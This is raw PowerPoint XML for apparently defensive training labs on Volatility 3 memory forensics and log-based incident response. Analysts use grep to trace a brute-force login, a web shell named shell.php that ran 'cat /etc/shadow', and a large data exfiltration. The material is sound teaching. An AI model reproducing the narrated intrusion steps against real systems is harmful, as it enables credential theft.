          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 8: DLL injection / code injection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>malfind looks for memory regions marked RWX with PE headers or shellcode — a textbook process-injection indicator.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Rectangle 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="3726179"/>
            <a:ext cx="3977639" cy="5486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52360" y="3726179"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ vol -f /tmp/cridex.vmem windows.dlllist --pid &lt;SUSPECT_PID&gt;</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Rectangle 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4520793"/>
            <a:ext cx="10634472" cy="78455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77240" y="4520793"/>
            <a:ext cx="91440" cy="78455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1005840" y="468447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05840" y="4684470"/>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32" name="TextBox 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4520793"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 9: Dump a suspect process and triage it</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>You now have a static artefact for AV/sandbox submission — derived from RAM only.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Rectangle 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="4638750"/>
            <a:ext cx="3977639" cy="5486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452360" y="4638750"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ mkdir -p /tmp/dump</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Rectangle 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5433364"/>
            <a:ext cx="10634472" cy="78455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77240" y="5433364"/>
            <a:ext cx="91440" cy="78455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05840" y="5597041"/>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05840" y="5597041"/>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5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="TextBox 38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5433364"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 10: Linux memory images</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>For Lab 21's AVML output, the equivalent plugins live under linux.*:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Rectangle 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="5551321"/>
            <a:ext cx="3977639" cy="5486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452360" y="5551321"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ vol -f /tmp/case_001/memory.lime linux.pslist</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741</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3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22 — What You Learned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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  By completing this lab you can:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Install and orient Volatility 3 against a memory image.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Enumerate processes, hidden processes, command lines, and live connections.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Detect injected code with malfind.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Dump processes to disk and feed them into Lab 9's static triage workflow.</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742</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3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23 — Log Analysis for Incident Response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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Objective</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  In this lab you will work an incident from a pile of journalctl and web-server logs: pivot from one IOC to the next, build a timeline, and produce the "Who, What, When, Where, Why" rows that feed the executive report. This maps to CySA+ 3.2 (Data and log analysis, IoC, Detection and analysis).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Environment: Killercoda Ubuntu Playground</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743</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3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23 — Reference Diagram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g_6438df1292.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2973181" y="1783080"/>
            <a:ext cx="6242590" cy="4434840"/>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744</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3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23 — Hands-On Steps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78455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78455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05840" y="194675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1946757"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 1: Seed a realistic log set</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="1901037"/>
            <a:ext cx="3977639" cy="5486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52360" y="1901037"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ apt update &amp;&amp; apt install -y jq</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2695651"/>
            <a:ext cx="10634472" cy="78455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2695651"/>
            <a:ext cx="91440" cy="78455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005840" y="285932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2859328"/>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8" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2695651"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 2: Triage with simple greps</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>5  203.0.113.7 flagged — the brute-force source.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="2813608"/>
            <a:ext cx="3977639" cy="5486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52360" y="2813608"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ grep "Failed password" auth.log | awk '{print $(NF-3)}' | sort | uniq -c</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Rectangle 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3608222"/>
            <a:ext cx="10634472" cy="78455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3608222"/>
            <a:ext cx="91440" cy="78455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005840" y="3771899"/>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05840" y="3771899"/>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5" name="TextBox 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="3608222"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 3: Pivot to the first success</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>08:00:06 root from 203.0.113.7 — the brute-force succeeded after 5 tries in 5 seconds.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Rectangle 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="3726179"/>
            <a:ext cx="3977639" cy="5486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52360" y="3726179"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ grep "Accepted" auth.log | grep 203.0.113.7</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Rectangle 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4520793"/>
            <a:ext cx="10634472" cy="78455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77240" y="4520793"/>
            <a:ext cx="91440" cy="78455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1005840" y="468447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05840" y="4684470"/>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32" name="TextBox 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4520793"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 4: Pivot to the web layer</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>The same IP uploaded shell.php two seconds after login and immediately executed id and cat /etc/shadow.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Rectangle 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="4638750"/>
            <a:ext cx="3977639" cy="5486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452360" y="4638750"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ grep 203.0.113.7 web.log</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Rectangle 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5433364"/>
            <a:ext cx="10634472" cy="78455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77240" y="5433364"/>
            <a:ext cx="91440" cy="78455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05840" y="5597041"/>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05840" y="5597041"/>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5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="TextBox 38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5433364"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 5: Pivot to the data exfil</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>A 1.07 GB flow from 10.0.0.50 to 185.220.101.45 at 08:10 — the exfiltration.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Rectangle 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="5551321"/>
            <a:ext cx="3977639" cy="5486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452360" y="5551321"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ grep -E "[0-9]{9,}" netflow.log</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745</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3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23 — Hands-On Steps (cont'd)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39293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39293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05840" y="22509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2250948"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="5486400" cy="1392936"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 6: Build the incident timeline</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>This table is dropped straight into the executive incident report (Lab 27) under "Timeline".</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="2205228"/>
            <a:ext cx="3977639" cy="5486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52360" y="2205228"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ cat &gt; timeline.md &lt;&lt;'EOF'</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3304032"/>
            <a:ext cx="10634472" cy="139293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304032"/>
            <a:ext cx="91440" cy="139293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005840" y="377190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3771900"/>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8" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="3304032"/>
            <a:ext cx="5486400" cy="1392936"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 7: Use journalctl for live systems</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>On the real host, the same workflow against systemd:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
